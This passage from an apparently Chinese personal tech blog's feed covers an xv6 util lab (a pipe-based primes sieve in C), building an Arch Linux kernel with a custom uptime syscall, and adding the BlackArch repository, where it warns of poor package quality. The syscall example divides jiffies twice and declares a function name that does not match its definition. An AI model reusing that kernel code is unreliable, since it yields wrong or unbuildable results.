class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">    sieve(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>  <span class="comment">//p process</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">      write(p[<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">//write numbers into pipe</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(p[<span class="number">1</span>]); <span class="comment">//close wiring of parent</span></span><br><span class="line">    wait((<span class="type">int</span> *)<span class="number">0</span>);  <span class="comment">//wait for all child process to end</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sieve</span><span class="params">(<span class="type">int</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> child[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">  close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(p[<span class="number">0</span>], &amp;n, <span class="keyword">sizeof</span>(<span class="type">int</span>)) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//exit </span></span><br><span class="line">  &#125;</span><br><span class="line">  pipe(child);</span><br><span class="line">  <span class="keyword">if</span> (fork() == <span class="number">0</span>)  <span class="comment">//child is not prime</span></span><br><span class="line">  &#123;</span><br><span class="line">    sieve(child); <span class="comment">//start a new child process</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    close(child[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, n);</span><br><span class="line">    <span class="type">int</span> prime = n;</span><br><span class="line">    <span class="keyword">while</span> (read((p[<span class="number">0</span>]), &amp;n, <span class="keyword">sizeof</span>(<span class="type">int</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (n%prime != <span class="number">0</span>) &#123;</span><br><span class="line">        write(child[<span class="number">1</span>], &amp;n, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(child[<span class="number">1</span>]);  <span class="comment">//close writing of parent</span></span><br><span class="line">    wait((<span class="type">int</span> *)<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始觉得这有什么难的，仿照go版本写一个不就完事了。也没看提示，在我本机上明明是好的扔到qemu的xv6上就开始乱了，调了半天。然后又读了一遍看到提示<code>Be careful to close file descriptors that a process doesn&#39;t need, because otherwise your program will run xv6 out of resources before the first process reaches 35.</code></p>
<p>然后发现打印出来有时是正确的，有时是乱序的。</p>
<p><img src="/6.s081-lab-util/image-20210703170414708.png" alt="image-20210703170414708"></p>
<p>最后又搜了一下， <span class="exturl" data-url="aHR0cHM6Ly93d3cuY3MuZGFydG1vdXRoLmVkdS9+ZG91Zy9zaWV2ZS9zaWV2ZS5wZGY=">Coroutine prime number sieve<i class="fa fa-external-link-alt"></i></span>, Douglas McIlroy在这里面给了一个c的例子，用dup来复制文件描述符，然后关闭管道。对照着这个我检查了一下，是少了一个<code>    close(p[0]);</code></p>
<p>比go麻烦好多……..</p>
<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><blockquote>
<p>Write a simple version of the UNIX find program: find all the files in a directory tree with a specific name. Your solution should be in the file <code>user/find.c</code>.</p>
</blockquote>
<p>这个不难，处理细节有点繁琐，注意递归的时候不要把<code>.</code>和<code>..</code>算进去就好了。可以参考<code>ls.c</code>和<code>grep.c</code>（选做正则匹配）。照抄ls的代码然后写一个简单的DFS或者BFS就可以了（目录是个树，如果不考虑软链接）。</p>
<h3 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h3><p>实现xarg命令，就用fork和exec实现就好了。这些碰到问题可以直接参考（抄 袭）一下xv6的源码或者gnu coreutils的实现。代码略长，不贴了。<strong>注意</strong>这里每次调试的时候要<code>make clean</code>清除编译缓存。</p>
<p>贴一个xargs用法的比较好的文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuanVubWFqaW5sb25nLmNvbS9zaGVsbC94YXJncy8=">Linux xargs命令详解<i class="fa fa-external-link-alt"></i></span> 为数不多的对这个命令的用心介绍。</p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>大三的时候学的微嵌（ARM的），当时讲的也水，大作业和实验也水（什么跑马灯驱动啊、ARM汇编啊，c内联汇编啊，还有一点FPGA），考试全都是抄书抄PPT写概念。深感当时学的太水了，走马观花看了一堆概念，实际上根本不会。</p>
<p>现在在实验室基本除了划水就是做一些CRUD的垃圾项目，什么XX管理系统，什么XX网站，什么基于机器学习的论文灌水；偶尔维护一下师兄师姐乱七八糟的祖传代码，感觉再这样虚度时光就要变成一个废人了，现在连c都生疏了。暂时打算从6.828和6.824开始，后面可能会做一点数据库的。</p>
<p>Verilog和VHDL这些暂时不打算再碰了，现在只想用c写。现在实验室有没有FPGA的板子，现在对RTL那些几乎也忘得差不多了，逻辑综合那些更别提了，本科那基本verilog的书当时疫情毕业也都送人了。</p>
<p>实验室已经两三年没人搞硬件了，堆在角落里的示波器和焊台也已经蒙了一层灰尘，罪过罪过。估计以后也没什么焊板子调运放的机会了…….</p>
<p>突然发现用go已经用习惯了，甚至感觉写go还挺舒服。。。用习惯了go的管道defer写close，写这个的时候老忘了close。<strong>而且我至少不下十次忘记末尾加分号<code>；</code>了</strong>，完了，写go写出肌肉记忆了。</p>
<p>（说起来Go写多了真是有点被惯坏了，现在再回去写c，手动管理内存和指针都觉得好麻烦，管道和进程也觉得不顺手。另一个非常非常难受的地方是，习惯了go很快的编译速度，现在每次等编译都好难受啊）</p>
<h2 id="参考和推荐"><a href="#参考和推荐" class="headerlink" title="参考和推荐"></a>参考和推荐</h2><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAyMC9zY2hlZHVsZS5odG1s">https://pdos.csail.mit.edu/6.828/2020/schedule.html<i class="fa fa-external-link-alt"></i></span></p>
<!-- 
https://www.cnblogs.com/fatsheep9146/p/5216681.html

https://www.cnblogs.com/fatsheep9146/category/769143.html

https://clownote.github.io/about/ -->

<p>xv6的资料</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAyMC94djYvYm9vay1yaXNjdi1yZXYxLnBkZg==">https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf<i class="fa fa-external-link-alt"></i></span></p>
<p>哈工大的课，跟6.S081前面几个lab差不多。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9oaXRzei1sYWIuZ2l0ZWUuaW8vb3NfbGFiLw==">https://hitsz-lab.gitee.io/os_lab/<i class="fa fa-external-link-alt"></i></span></p>
<p>risc-v 资料</p>
<p><span class="exturl" data-url="aHR0cDovL2NydmEuaWN0LmFjLmNuL2RvY3VtZW50cy9SSVNDLVYtUmVhZGVyLUNoaW5lc2UtdjJwMS5wZGY=">http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf<i class="fa fa-external-link-alt"></i></span></p>
<p>调试：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly90d2RsbGwuZ2l0aHViLmlvLzIwMjAvMTEvMTAvNi5TMDgxLTIv">https://twdlll.github.io/2020/11/10/6.S081-2/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNjY0MTM2MDQ=">https://zhuanlan.zhihu.com/p/166413604<i class="fa fa-external-link-alt"></i></span> clion调试</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS2F0eXVNYXJpc2FCbG9nL3AvMTM3Mjc1NjUuaHRtbA==">https://www.cnblogs.com/KatyuMarisaBlog/p/13727565.html<i class="fa fa-external-link-alt"></i></span> vscode调试</p>
<h3 id="其他的一些推荐"><a href="#其他的一些推荐" class="headerlink" title="其他的一些推荐"></a>其他的一些推荐</h3><p><em>The Linux Programming Interface: A Linux and UNIX System Programming Handbook</em>（中文版：《Linux&#x2F;Unix系统编程手册》上下两册，下册翻译的很烂），相当不错的工具书，可以放在手边当参考书和工具书用。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvaW5kZXguaHRtbA==">Linux man pages online<i class="fa fa-external-link-alt"></i></span> 在线参考手册，必备</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NJLVJJU0NWL2UyMDBfb3BlbnNvdXJjZQ==">https://github.com/SI-RISCV/e200_opensource<i class="fa fa-external-link-alt"></i></span> 没看过，据说还行。</p>
<p>现代操作系统</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9pcGFkcy5zZS5zanR1LmVkdS5jbi9tb3NwaS8=">《现代操作系统：原理与实现》<i class="fa fa-external-link-alt"></i></span> 上交IPADS的，我还没买。据说相当不错。（这本我自己一点也没看过，）</p>
<h3 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a>前置工作</h3><p>c语言， 大概弄懂k&amp;r那本<em>The C Programming Language</em>就可以开工了。当然，懂得越多越好，多多益善。</p>
<p><strong>菊巨可以用Rust哦，贵清<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Jjb3JlLW9zL3JDb3Jl">rCore<i class="fa fa-external-link-alt"></i></span>那边的课据说挺好的</strong>（群友们人均Rust, 就只本菜不会Rust了）</p>
<p>gdb等调试手段要熟， 没法调试等着两眼抓瞎吧。</p>
<p>熟悉链接库和编译那一套，Makefile什么的会用就行了。不熟悉编译的去编译个LFS（Linux from Scratch）就差不多了。</p>
<p>一些基础的书和知识，比如csapp等书可以先看看。</p>
<p>参考手册和工具书先备着，RISC-V的资料也备着。xv6有很多可以参考的地方。</p>
<p>xv6的资料在这里：<span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAyMC94djYuaHRtbA==">https://pdos.csail.mit.edu/6.828/2020/xv6.html<i class="fa fa-external-link-alt"></i></span><br>这有一个中文的翻译：（版本略老，是x86的）<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhbnhpYW4veHY2LWNoaW5lc2U=">https://github.com/ranxian/xv6-chinese<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>xv6</tag>
      </tags>
  </entry>
  <entry>
    <title>在Archlinux下编译Linux内核（以添加系统调用为例）</title>
    <url>/add-a-syscall-to-linux-kernel/</url>
    <content><![CDATA[<p>今天手痒玩一下Archlinux的编译内核，顺便观摩一下Arch内核打包是什么样的（不知道用什么举例子就添加个syscall算了）</p>
<span id="more"></span>

<p>体验还不错，Archlinux编译内核啥的还都挺简单的（相比于LFS），而且打包也方便。以后不开qemu了，直接裸机编译内核玩喽。  </p>
<h2 id="下载和准备编译环境"><a href="#下载和准备编译环境" class="headerlink" title="下载和准备编译环境"></a>下载和准备编译环境</h2><p>Archlinux编译内核有两种方式，一种是传统的编译方式（玩过LFS或者gentoo的应该很熟悉），另一种是ABS（Arch Build System，可以打一个AUR包供他人使用）。其他发行版的读者请跳过ABS，只看手动编译即可。</p>
<p>第一种和通常的手工编译内核没什么区别，这里先演示添加系统调用并手动打包。（如果不是为了打包其实直接手动编译更方便点）下载内核源码并解压，内核版本和解压路径换成你自己想要的（如果不想打包生成patch文件，不需要<code>git init</code>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.16.15.tar.xz</span><br><span class="line"><span class="built_in">mkdir</span> ./linux-zhixi</span><br><span class="line">tar xf linux-5.16.15.tar.xz --directory=./linux-zhixi --strip-components 1</span><br><span class="line"><span class="built_in">cd</span> linux-zhixi</span><br><span class="line"><span class="comment"># if you want to create a patch for packaging</span></span><br><span class="line"><span class="comment"># git init</span></span><br></pre></td></tr></table></figure>

<h2 id="添加系统调用"><a href="#添加系统调用" class="headerlink" title="添加系统调用"></a>添加系统调用</h2><p>接下来我们添加一个系统调用，统计开机到现在用了多少秒。<br>修改<code>arch/x86/entry/syscalls/syscall_64.tbl</code>系统调用表，仿照上面的格式加上一行，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">548 common  uptime          sys_getuptime</span><br></pre></td></tr></table></figure>

<p>然后增加系统调用，随便找个位置，比如<code>kernel/time/getuptime.c</code>， 但是为了不把kernel目录搞乱，我自己建一个<code>zhixi</code>的目录放<code>getuptime.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sys_getuptime - get how many seconds have elapsed since boot</span></span><br><span class="line"><span class="comment"> * @secs: return the value of secs corresponding to jiffies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/jiffies.h&gt;</span></span></span><br><span class="line">SYSCALL_DEFINE1(getuptime, <span class="type">unsigned</span> <span class="type">int</span> __user *, secs)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> kjiffies = (get_jiffies_64() - INITIAL_JIFFIES) / <span class="number">1000</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> ksecs = jiffies_to_secs(kjiffies);</span><br><span class="line">        copy_to_user(secs, &amp;ksecs, <span class="keyword">sizeof</span>(ksecs));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了在编译内核的时候编译这个文件，在<code>zhixi</code>目录下增加<code>Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-y := getuptime.o</span><br></pre></td></tr></table></figure>

<p>然后给源码根目录的Makefile加上<code>zhixi/</code></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ zhixi/</span><br></pre></td></tr></table></figure>

<p>然后编辑<code>include/linux/syscalls.h</code>头文件加上自己的系统调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* zhixi/getuptime.c */</span></span><br><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_getms_sinceboot</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> __user *secs)</span>;</span><br></pre></td></tr></table></figure>

<p>一个简单的系统调用就加好了。</p>
<h2 id="手动编译内核"><a href="#手动编译内核" class="headerlink" title="手动编译内核"></a>手动编译内核</h2><p>编译内核的时候可以直接copy目前linux的config:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zcat /proc/config.gz &gt; .config</span><br></pre></td></tr></table></figure>

<p>或者自己手动选择一些配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<h3 id="减少编译时间"><a href="#减少编译时间" class="headerlink" title="减少编译时间"></a>减少编译时间</h3><p>可以用modprobed-db生成配置（<code>make localmodconfig</code>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S modprobed-db</span><br></pre></td></tr></table></figure>

<p>然后编辑<code>~/.config/modprobed-db.conf</code></p>
<p>这个工具可以在编译内核的时候忽略不需要的module，加快编译速度。我这里编译的速度缩短了大概三分之一左右。</p>
<h3 id="给kernel打patch"><a href="#给kernel打patch" class="headerlink" title="给kernel打patch"></a>给kernel打patch</h3><p>在PKGBUILD中打patch请参考：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvUGF0Y2hpbmdfcGFja2FnZXNfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4NykjJUU1JUJBJTk0JUU3JTk0JUE4JUU4JUExJUE1JUU0JUI4JTgx">Patching_packages_(简体中文)#应用补丁<i class="fa fa-external-link-alt"></i></span>  </p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvUGF0Y2hpbmdfcGFja2FnZXM=">ArchWiki Patching pacakages<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvS2VybmVsL1RyYWRpdGlvbmFsX2NvbXBpbGF0aW9u">Kernel&#x2F;Traditional compilation<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQXJjaF9CdWlsZF9TeXN0ZW1fKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Arch Build System (简体中文)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9iaXNjdWl0b3MuZ2l0aHViLmlvL2Jsb2cvU1lTQ0FMTF9BRERfTkVXX1g4Nl82NC8jaGVhZGVy">X86_64 架构增加一个系统调用<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>syscall</tag>
        <tag>linux</tag>
        <tag>archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>给Archlinux添加blackarch仓库镜像源</title>
    <url>/add-blackarch-repo-mirrors/</url>
    <content><![CDATA[<p>更新：BlackArch镜像源的很多包质量很差，请谨慎添加，必要时请修改PKGBUILD或自行打包。</p>
<span id="more"></span>

<h2 id="更新和劝退（只是想添加blackarch源的请直接看第二节）"><a href="#更新和劝退（只是想添加blackarch源的请直接看第二节）" class="headerlink" title="更新和劝退（只是想添加blackarch源的请直接看第二节）"></a>更新和劝退（只是想添加blackarch源的请直接看第二节）</h2><p>虽然BlackArch的包很多，但是…….</p>
<p>BlackArch的打包质量很差（甚至有些包可能比AUR更差），不少包都是用工具直接转的，而且更要命的是很多包缺乏维护（这对于Arch系这些更新频繁的包可不太妙）</p>
<p>会发生一些离谱的事情，比如这种：<span class="exturl" data-url="aHR0cHM6Ly9mcmVlbm9kZS5sb2dib3QuaW5mby9hcmNobGludXgtY24vMjAyMTA1MTgjYzgwNDcwMjk=">https://freenode.logbot.info/archlinux-cn/20210518#c8047029<i class="fa fa-external-link-alt"></i></span></p>
<p>一些活跃的第三方源，比如archlinuxcn，arch4edu，处理问题比较及时，质量也比AUR的包更放心。一般的AUR helper，比如yay, pikaur都喜欢把添加的源里的包优先级放到AUR前面。<code>sudo pacman -Syyu</code>也会把本地新的包降级。BlackArch里面很多万年不更新也没人维护的老包，会很麻烦。</p>
<p>比如neo4j-community，AUR比blackarch源里的新，直接用pacman或者yay等AUR Helper安装就会装一个远古的老版本<br>（不是3.X版本稳定的原因，单纯就是没人维护，<span class="exturl" data-url="aHR0cHM6Ly9uZW80ai5jb20vZG93bmxvYWQtY2VudGVyLz9yZWY9c3Vic2NyaXB0aW9uI2NvbW11bml0eQ==">官网的版本<i class="fa fa-external-link-alt"></i></span>现在3.5.28是20 April 2021发布的，BlackArch的官方源更新是在一<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JsYWNrQXJjaC9ibGFja2FyY2gvY29tbWl0L2FiNDk4MGEzNmNkNDcxY2E0ZjRmNGNhMWMxN2Q2YjdlNWU2ZGFhZTk=">2020年3月<i class="fa fa-external-link-alt"></i></span>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aur/neo4j-community 4.2.2-1 (+63 0.40) (Out-of-date: 2021-06-06) (Installed)</span><br><span class="line">    A fully transactional graph database implemented in Java</span><br><span class="line">blackarch/neo4j-community 3.5.14-1 (144.4 MiB 165.9 MiB) (Installed: 4.2.2-1)</span><br><span class="line">    A fully transactional graph database implemented in Java</span><br></pre></td></tr></table></figure>

<p>主动安装AUR里的可以这样：<code>yay neo4j-community</code>然后<code>Packages to install</code>选项手动选AUR里的。或者你手动下载AUR里的PKGBUILD然后<code>makepkg</code>自己build。<strong>再或者直接不要blackarch这个第三方源了（推荐）</strong>，<code>/etc/pacman.d</code>里注释掉。</p>
<p>不然每次更新还要忽略一堆<code>warning: neo4j-community: local (4.2.2-1) is newer than blackarch (3.5.14-1)</code>。</p>
<p>neo4j这种单个没啥影响的包更新迟缓倒也没啥大问题，问题是BlackArch的包经常会影响community&#x2F;extra的基础包，比如plasma这个包（某一天某个群友亲历，我由于装的是plasma-meta逃过一劫）</p>
<p>KDE用户注意：如果你添加了BlackArch源，按照<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvS0RFI1BsYXNtYQ==">ArchWiki上的KDE页面<i class="fa fa-external-link-alt"></i></span>添加plasma元组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syu plasma</span><br></pre></td></tr></table></figure>

<p>不仔细看plasma是安装成功了，也没报错。然后就掉到Blackarch的plasma这个包的坑里的,<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JsYWNrQXJjaC9ibGFja2FyY2gvYmxvYi9tYXN0ZXIvcGFja2FnZXMvcGxhc21hL1BLR0JVSUxE">plamsa<i class="fa fa-external-link-alt"></i></span>是BlackArch里面一个python写的一个工具的包，跟KDE Plasma一点关系都没有。</p>
<p>没想到吧，我也没想到。因为<strong>按照ArchLinux的VSC打包规范</strong>，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BsYXNtYS1kaXNhc3NlbWJsZXIvcGxhc21h">plasma<i class="fa fa-external-link-alt"></i></span>这个东西的包名<strong>应该叫做 plasma-git</strong></p>
<p>你得这样安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -Syu extra/plasma.</span><br></pre></td></tr></table></figure>

<p>BlackArch仓库人手不够打包质量差、更新不及时我都能理解，能跟extra仓库冲突了就离谱。</p>
<p>下面传肥猫领袖重要讲话：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Felix Yan, [05.02.21 01:08]</span><br><span class="line">想起来我当年研究过 blackarch 的仓库</span><br><span class="line"></span><br><span class="line">Felix Yan, [05.02.21 01:09]</span><br><span class="line">想把里面的工具往主仓库搬</span><br><span class="line"></span><br><span class="line">Felix Yan, [05.02.21 01:09]</span><br><span class="line">结果真找不到几个能搬的</span><br><span class="line"></span><br><span class="line">Felix Yan, [05.02.21 01:09]</span><br><span class="line">大部分都是坑工具……</span><br><span class="line"></span><br><span class="line">（里面有很多质量堪忧或者版权不明白的工具，不适合放到一个正常发行版</span><br><span class="line"></span><br><span class="line">质量好的工具我当年整过一波，该打的大部分都打了</span><br></pre></td></tr></table></figure>

<p>或许单独装个kali是个不错的选择。平时日用好像Parrot os也不错。我反正Arch够用了（我又不干坏事）。</p>
<p>以下为原内容，写于 2020.11 目测有效，不保证该方法以后可能过时，建议自行翻阅官方文档。</p>
<h2 id="导入仓库和设置国内镜像"><a href="#导入仓库和设置国内镜像" class="headerlink" title="导入仓库和设置国内镜像"></a>导入仓库和设置国内镜像</h2><h3 id="导入仓库"><a href="#导入仓库" class="headerlink" title="导入仓库"></a>导入仓库</h3><p>按照官方文档来：</p>
<p>下载官网的脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O https://blackarch.org/strap.sh</span><br></pre></td></tr></table></figure>

<p>修改权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x strap.sh</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./strap.sh</span><br></pre></td></tr></table></figure>

<p>然后应该就好了</p>
<p>看看是不是装好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Sg | grep blackarch</span><br></pre></td></tr></table></figure>

<p>然后更新一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syyu</span><br></pre></td></tr></table></figure>

<p>这时候应该会给你安装<code>blackarch-keying</code>这个包，然后就可以用了</p>
<h3 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h3><p>修改<code>/etc/pacman.conf</code>，在最后加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[blackarch]</span><br><span class="line">Server = http://mirrors.uestc.cn/blackarch/$repo/os/$arch</span><br></pre></td></tr></table></figure>

<p>Server请改成你在那里提供服务而且网速比较快的，比如tuna的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[blackarch]</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/blackarch/$repo/os/$arch</span><br></pre></td></tr></table></figure>

<h2 id="为何要写这么水的一篇博客"><a href="#为何要写这么水的一篇博客" class="headerlink" title="为何要写这么水的一篇博客"></a>为何要写这么水的一篇博客</h2><p>我之前谷歌随手搜出了ustc的镜像使用帮助，然后就开始了飘红报错，试了一圈中文的解决方案，并没有用。<br>（当然中文博客基本都过时了，还是有很多好好写的，不止CSDN,比如这个：<span class="exturl" data-url="aHR0cHM6Ly93ZWVwaW5nZG9nZWwuZ2l0aHViLmlvL3Bvc3RzLyVFNyU5NCVBOGFyY2hfbGludXglRTYlODklOTMlRTklODAlQTAlRTUlQUUlOEMlRTclQkUlOEUlRTYlQjglOTclRTklODAlOEYlRTclOEUlQUYlRTUlQTIlODMv">用 Arch Linux 打造完美渗透环境<i class="fa fa-external-link-alt"></i></span>）</p>
<p>报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">error: blackarch: key <span class="string">&quot;F9A6E68A711354D84A9B91637533BAFE69A25079&quot;</span> is unknown</span><br><span class="line">:: Import PGP key F9A6E68A711354D84A9B91637533BAFE69A25079? [Y/n] Y</span><br><span class="line">Y</span><br><span class="line">error: key <span class="string">&quot;F9A6E68A711354D84A9B91637533BAFE69A25079&quot;</span> could not be looked up remotely</span><br><span class="line">:: Synchronizing package databases...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error: blackarch: key <span class="string">&quot;F9A6E68A711354D84A9B91637533BAFE69A25079&quot;</span> is unknown</span><br><span class="line">:: Import PGP key F9A6E68A711354D84A9B91637533BAFE69A25079? [Y/n] </span><br><span class="line">error: key <span class="string">&quot;F9A6E68A711354D84A9B91637533BAFE69A25079&quot;</span> could not be looked up remotely</span><br><span class="line">error: failed to update blackarch (invalid or corrupted database (PGP signature))</span><br><span class="line">error: failed to synchronize all databases</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现中文的几个解决方案全都过时了。安装<code>blackarch-keying</code>导入key会产生先有鸡还是先有蛋的问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S blackarch-keyring</span><br><span class="line">error: blackarch: key <span class="string">&quot;F9A6E68A711354D84A9B91637533BAFE69A25079&quot;</span> is unknown</span><br><span class="line">:: Import PGP key F9A6E68A711354D84A9B91637533BAFE69A25079? [Y/n] Y</span><br><span class="line">error: key <span class="string">&quot;F9A6E68A711354D84A9B91637533BAFE69A25079&quot;</span> could not be looked up remotely</span><br><span class="line">error: database <span class="string">&#x27;blackarch&#x27;</span> is not valid (invalid or corrupted database (PGP signature))</span><br></pre></td></tr></table></figure>

<p>转了一圈还是翻了官方文档，世界瞬间清净了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] installing blackarch keyring...</span><br><span class="line"></span><br><span class="line">loading packages...</span><br><span class="line">resolving dependencies...</span><br><span class="line">looking <span class="keyword">for</span> conflicting packages...</span><br><span class="line"></span><br><span class="line">Packages (1) blackarch-keyring-20140118-3</span><br><span class="line"></span><br><span class="line">Total Installed Size:  0.04 MiB</span><br><span class="line"></span><br><span class="line">:: Proceed with installation? [Y/n] </span><br><span class="line">(1/1) checking keys <span class="keyword">in</span> keyring                                         [<span class="comment">#######################################] 100%</span></span><br><span class="line">(1/1) checking package integrity                                       [<span class="comment">#######################################] 100%</span></span><br><span class="line">(1/1) loading package files                                            [<span class="comment">#######################################] 100%</span></span><br><span class="line">(1/1) checking <span class="keyword">for</span> file conflicts                                      [<span class="comment">#######################################] 100%</span></span><br><span class="line">:: Processing package changes...</span><br><span class="line">(1/1) installing blackarch-keyring                                     [<span class="comment">#######################################] 100%</span></span><br><span class="line">==&gt; Appending keys from blackarch.gpg...</span><br><span class="line">gpg: public key DB323392796CA067 is 3037 days newer than the signature</span><br><span class="line">gpg: public key CF66D153D884358F is 16 seconds newer than the signature</span><br><span class="line">==&gt; Locally signing trusted keys <span class="keyword">in</span> keyring...</span><br><span class="line">  -&gt; Locally signing key A0917C4147A37007CB54C1CFD295AA940EFDDF62...</span><br><span class="line">  -&gt; 